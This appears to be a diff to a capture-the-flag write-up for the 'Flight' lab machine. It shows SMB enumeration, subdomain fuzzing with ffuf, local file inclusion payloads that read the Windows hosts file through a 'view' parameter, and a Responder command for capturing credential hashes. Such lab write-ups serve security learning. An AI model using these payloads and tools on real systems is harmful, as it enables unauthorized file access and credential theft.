@@ -6,6 +6,7 @@ http://10.10.11.187/webalizer
 smbclient -L \\\\10.10.11.187\\
 ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://flight.htb/ -H "Host: FUZZ.flight.htb" -fs 7069 -fw 22
 http://school.flight.htb/
+http://school.flight.htb/index.php?view=home.html
 http://school.flight.htb/index.php?view=C:\Windows\System32\drivers\etc\hosts
 http://school.flight.htb/index.php?view=C:/Windows/System32/drivers/etc/hosts
 responder -I tun0 -v
@@ -120,10 +121,13 @@ smbclient -L \\\\10.10.11.187\\
 ```
 ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://flight.htb/ -H "Host: FUZZ.flight.htb" -fs 7069 -fw 22
 http://school.flight.htb/
+http://school.flight.htb/index.php?view=home.html
 ```
 ![image](https://github.com/user-attachments/assets/aee893f0-607c-4bcf-a79f-6e64c1b3b467)
 
 ![image](https://github.com/user-attachments/assets/3544e75a-a72e-4445-a9a8-2d8425e73698)
+
+![image](https://github.com/user-attachments/assets/6bf4a879-e90f-41ed-bca8-3f1a4eedfdc3)
 
 ![image](https://github.com/user-attachments/assets/afe1a807-2a86-4823-bc31-ed7d4613d2ec)
 
